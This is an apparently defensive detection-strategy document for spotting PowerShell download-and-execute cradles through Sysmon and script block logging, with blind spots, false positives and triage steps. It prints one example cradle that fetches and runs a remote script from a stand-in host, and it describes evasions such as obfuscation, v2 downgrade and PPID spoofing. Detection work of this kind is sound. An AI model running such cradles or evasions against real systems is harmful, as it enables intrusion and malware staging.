# PowerShell Execution — Download Cradle Detection

> **Technique**: T1059.001 — Command and Scripting Interpreter: PowerShell
> **Tactic**: Execution (TA0002)
> **Severity**: High
> **Status**: Experimental

---

## Goal

Detect adversaries using PowerShell to download and execute payloads, covering both cleartext and encoded invocations. The detection targets the download-and-execute slice of T1059.001 specifically: a fetch primitive (pulling bytes off the network) combined with in-memory execution (never touching disk), which is the canonical PowerShell staging pattern used across commodity malware and nation-state implants alike.

---

## Categorisation

| Field | Value |
|---|---|
| ATT&CK Tactic | Execution (TA0002) |
| ATT&CK Technique | Command and Scripting Interpreter: PowerShell (T1059.001) |
| Data Source | Sysmon EID 1 (process creation) / Windows Event ID 4104 (script block logging) |
| Log Category | `process_creation` (Rule A) · `ps_script` (Rule B) |
| Platform | Windows |
| SIEM | Microsoft Sentinel (KQL) · Splunk (SPL) |

---

## Strategy Abstract

Two complementary rules cover the attack chain from opposite ends.

**Rule A** (`sysmon.yml` → EID 1) monitors PowerShell and pwsh process-creation events and fires when a suspicious parent process (Office apps, script hosts, LOLBin proxies, server workers) is present alongside at least one behavioural indicator — a fetch primitive, evasion flag, or in-memory execution marker — visible on the command line. This is the **launch-context** rule: it fires even when `-EncodedCommand` hides the payload, because the flag itself is suspicious.

**Rule B** (`rule.yml` + `rule.kql` / `rule.spl` → EID 4104) This rule was developed into kql and splunk as it was more promising than rule A, monitors PowerShell Script Block Logging events and fires on the **decoded script content**. Because the PowerShell engine must decode any base64 payload before it can run it, EID 4104 always sees the cleartext intent regardless of encoding. A severity tier is applied per execution: a fused download cradle (fetch primitive AND in-memory execution in the same block) is High; any single content signal is Medium.

Any cross-rule correlation (EID 1 + 4104 from the same host/process) is handled at the platform's correlation layer — either an explicit KQL join or Sentinel's native entity-based alert grouping — rather than inside either base rule.

---

## Technical Context

### Attack Mechanics

PowerShell is the dominant living-off-the-land execution shell on Windows. Its built-in networking stack, reflection APIs, and in-memory execution primitives make it the standard vehicle for pulling a second-stage payload past application allow-lists and execution controls.

The canonical download-cradle pattern:

```powershell
# fetch primitive + in-memory execution — payload never touches disk
IEX (New-Object Net.WebClient).DownloadString('http://evil.example/stage2.ps1')
```

PowerShell's parameter-abbreviation quirk significantly broadens the evasion surface: `-EncodedCommand` resolves from `-enc`, `-e`, or any unambiguous prefix. The same applies to `-ExecutionPolicy`, `-WindowStyle`, `-NonInteractive`, and `-NoProfile`. Simple string-match detections on the full flag name miss all abbreviated forms; the Sigma rules use the `windash` modifier and the KQL/SPL rules use regex to handle this.

Additionally, EID 4104 logs what the engine *compiles*, not a normalised version. Inline source obfuscation (string concatenation `'Down'+'loadString'`, char-code arrays, backtick insertion `` D`o`wnloadString ``) is logged **literally**, meaning a naive substring match on `DownloadString` misses these variants unless they are re-invoked through `IEX` or `[ScriptBlock]::Create`, which causes the next compiled block to be logged in cleartext.

### Telemetry

**Sysmon EID 1 — Process Creation (Rule A)**

| Sysmon Field | Description |
|---|---|
| `Image` | Full path — must end with `\powershell.exe` or `\pwsh.exe` |
| `CommandLine` | Full command line — cleartext fetch primitives and evasion flags visible here (not under `-enc`) |
| `ParentImage` | Launching process — one level only; walk `ProcessGuid` chain for full lineage |
| `ProcessGuid` / `ProcessId` | Correlation key for joining EID 1 to EID 4104 |

**Windows Event ID 4104 — Script Block Logging (Rule B)**

| Field | Description |
|---|---|
| `ScriptBlockText` | The decoded PowerShell code as compiled by the engine — the core detection field |
| `ScriptBlockId` | GUID correlating block fragments from the same execution |
| `Path` | File path if run from a file; empty for interactive or in-memory execution |
| `HostApplication` | The launching command line (e.g. `powershell.exe -enc ...`) |
| `MessageNumber` / `MessageTotal` | Indicates when one large block is split across multiple events |

### Detection Logic

The severity tiers across both rules:

| Tier | Condition | Rationale |
|---|---|---|
| **High** | Fetch primitive AND in-memory execution together | The fused download cradle — payload intent is unambiguous |
| **Medium** | Any single content signal (fetch, memory, or obfuscation) | Single signals have meaningful FP rates but warrant review |
| **Informational** | Suppressed — not forwarded to analysts | Noise reduction; fetch alone (e.g. `iwr -OutFile`) is common admin behaviour |

Rule A also applies tiering via its Sigma `condition` clause: a suspicious parent alongside two or more indicators, or a memory+evasion combination, triggers the High rule; a suspicious parent alongside any single indicator triggers the Medium rule.

---

## Blind Spots & Assumptions

**Assumptions:**

- Sysmon 15.x is deployed with a configuration that collects process-creation events (EID 1).
- PowerShell Script Block Logging is enabled via GPO or registry (`EnableScriptBlockLogging = 1`). Without it, PowerShell 5.x auto-logs only blocks it heuristically flags as suspicious — full content coverage is not guaranteed.
- Sysmon and Windows Event logs are forwarded to Microsoft Sentinel within a reasonable time window (≤15 minutes) via the Azure Monitor Agent.
- PowerShell v2 is blocked or unavailable (`-version 2` predates script block logging and emits no EID 4104 events).
- `pwsh` (PowerShell 7) is in scope — the Sigma `ps_script` logsource must be mapped to the `PowerShellCore/Operational` channel in addition to the standard 5.1 channel.

**Blind Spots:**

- **PowerShell v2 downgrade** — `powershell.exe -version 2` predates script block logging entirely. No EID 4104 is emitted; Rule B is completely blind. Rule A may still fire on command-line signals if visible.
- **Inline source obfuscation** — string concatenation (`'Down'+'loadString'`), char-code arrays, and backtick insertion are logged literally by 4104 and bypass substring matching. The content only becomes detectable if the obfuscated result is handed back to `IEX`, which re-logs the decoded form as a new block.
- **PPID spoofing** — an adversary using `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` can forge the parent recorded in EID 1, defeating Rule A's parent-lineage tier. Rule B (content-based, parent-independent) remains effective.
- **Single-level parent matching** — Rule A inspects only `ParentImage` (one level). The chain `winword.exe → cmd.exe → powershell.exe` defeats an immediate-parent check. Walk `ProcessGuid` lineage in KQL for additional depth; document as a triage note when only one level is available.
- **Custom cmdlet aliases and .NET reflection** — adversaries writing wrapper functions or invoking the HTTP stack via raw .NET reflection without calling named PowerShell primitives can bypass the content-signal keyword list entirely.
- **pwsh channel split** — PowerShell 7 logs to `PowerShellCore/Operational`, not `Microsoft-Windows-PowerShell/Operational`. Confirm both channels are ingested and reaching the Sentinel `Event` table via AMA.

---

## False Positives

- **Routine admin automation** — administrators frequently use `Invoke-WebRequest`, `IEX`, and download primitives for legitimate script deployment. Medium alerts will fire on this traffic regularly. Tune by baselining known-good script paths or signing states in the environment.
- **Endpoint management tooling** — SCCM, Intune, and Defender for Endpoint natively execute PowerShell script blocks containing fetch primitives and in-memory constructs. These typically originate from well-known management process paths; add those paths to a filter after reviewing your environment baseline.
- **Security tooling** — some AV, EDR, and vulnerability scanner products invoke PowerShell with patterns that match the detection. Common sources are `MsMpEng.exe` and similar Defender processes.
- **Developers and CI/CD pipelines** — build pipelines and developer workstations frequently use download primitives for dependency fetching. Consider restricting this rule to endpoint populations if server or build-agent FP rates are unacceptable.

---

## Priority / Severity

**Severity: High**

The download-cradle pattern (fetch + in-memory execution) is a foundational technique across commodity malware loaders, RATs, and nation-state stagers. A PowerShell process pulling a payload from the network and executing it in memory without touching disk is a canonical attacker behaviour with low legitimate usage in non-IT user populations.

The High rather than Critical rating reflects that Medium signals carry a meaningful FP rate in environments with active PowerShell-heavy administration or management tooling. The tiered model (Medium for single signals, High for fused cradles) balances detection coverage against analyst fatigue — rules that fire constantly become ignored.

---

## Validation

See [validation.md](validation.md) for the full test record.

**Tests run**: Atomic Red Team T1059.001 — Test 6 (MsXml COM object + IEX), Test 7 (PowerShell XML requests)

**Outcome**: Rule B fired on Test 6, correctly identifying in-memory execution (`IEX`) and alerting at Medium severity. Test 7 produced no alert — the XML-based fetch mechanism falls outside the current keyword list. The detection covers a narrow slice of the PowerShell execution surface and is evasable by any fetch primitive not in the matched list, or by splitting fetch and execution across separate script blocks. A V2 is planned to broaden COM/HTTP primitive coverage and correlate split blocks via `ScriptBlockId` chaining to recover the fused High-tier alert.

---

## Response

When this alert fires, an analyst should:

1. **Check the Detection Reason field** — the alert populates this with the specific signals that fired (e.g. "Download + in-memory execution", "Obfuscated PowerShell"). This determines the immediate priority of the investigation.

2. **Examine `ScriptBlockText`** — read the decoded script content from the EID 4104 event. Does it reference external infrastructure (URLs, IPs, domains)? Does it drop or invoke a file? Is this recognisable admin tooling or clearly malicious?

3. **Identify the launching process** — check `Image` / `ParentImage` from the corresponding EID 1 event (or `InitiatingProcessFolderPath` in MDE). Is the parent a known management tool, or is it an Office application, script host, or LOLBin? User-writable parent paths (`%TEMP%`, `%APPDATA%`) are a strong malicious indicator.

4. **Review the process tree** — walk the full ancestry (ProcessGuid chain in Sentinel, or MDE process tree). Chains like `winword.exe → wscript.exe → powershell.exe` downloading a payload or `explorer.exe → powershell.exe` invoking IEX are high-confidence malicious.

5. **Pivot on external infrastructure** — extract any URLs, IPs, or domains from `ScriptBlockText` and check them against threat intelligence. Query `DeviceNetworkEvents` or Sentinel's network tables for outbound connections from the same host in the ±5 minute window.

6. **Check for follow-on activity** — look for file drops (`DeviceFileEvents`), additional persistence mechanisms (run keys, scheduled tasks), lateral movement, or credential access in the same session.

7. **Contain if malicious** — isolate the host via MDE live response or network quarantine. Preserve memory if the process is still active (in-memory payloads are lost on reboot). Open an IR ticket and escalate per your organisation's playbook.

---

## References

- [MITRE ATT&CK — T1059.001](https://attack.mitre.org/techniques/T1059/001/)
- [Atomic Red Team — T1059.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md)
- [SigmaHQ — PowerShell script rules](https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell)
- [SigmaHQ — PowerShell process creation rules](https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation)
- [Microsoft Docs — About Script Block Logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
- [Pyramid of Pain — David Bianco](https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html)
- [Palantir ADS Framework](https://github.com/palantir/alerting-detection-strategy-framework)
